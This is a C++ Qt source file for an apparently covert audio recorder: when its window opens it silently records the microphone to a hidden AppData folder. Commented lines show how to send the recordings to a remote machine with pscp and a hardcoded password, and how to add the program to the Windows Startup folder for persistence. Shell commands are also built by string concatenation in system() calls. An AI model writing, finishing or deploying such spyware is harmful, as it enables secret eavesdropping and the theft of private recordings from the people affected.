#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QAudioRecorder>
#include <QUrl>
#include <QtMultimedia>


MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{

    QString checkPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/test/check";
    QString audioPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/audio";

    // send to your computer, in my case I am using ubuntu so I can setup ssh to receive files
    // system(qPrintable("pscp -pw 'yourpassword' " + audioPath + "/filename.amr User@ip:/home"));

    // check if folders&files are created

    if(!QFileInfo::exists(checkPath)){

        system(qPrintable("mkdir " + QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/test"));
        QString mkfilecmd = "touch " + checkPath;
        system(qPrintable(mkfilecmd));
        system(qPrintable("mkdir " + audioPath));

        // add up to start up (optional)
        // system(qPrintable(move appname, "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"));
        // or use QStandardPaths

    }

    audioRecorder = new QAudioRecorder;

    QAudioEncoderSettings audioSettings;
    audioSettings.setCodec("audio/amr");
    audioSettings.setQuality(QMultimedia::HighQuality);

    audioRecorder->setEncodingSettings(audioSettings);

    audioRecorder->setOutputLocation(QUrl::fromLocalFile(audioPath + "/filename.amr"));
    audioRecorder->record();

    ui->setupUi(this);
}

MainWindow::~MainWindow()
{

    delete ui;
}

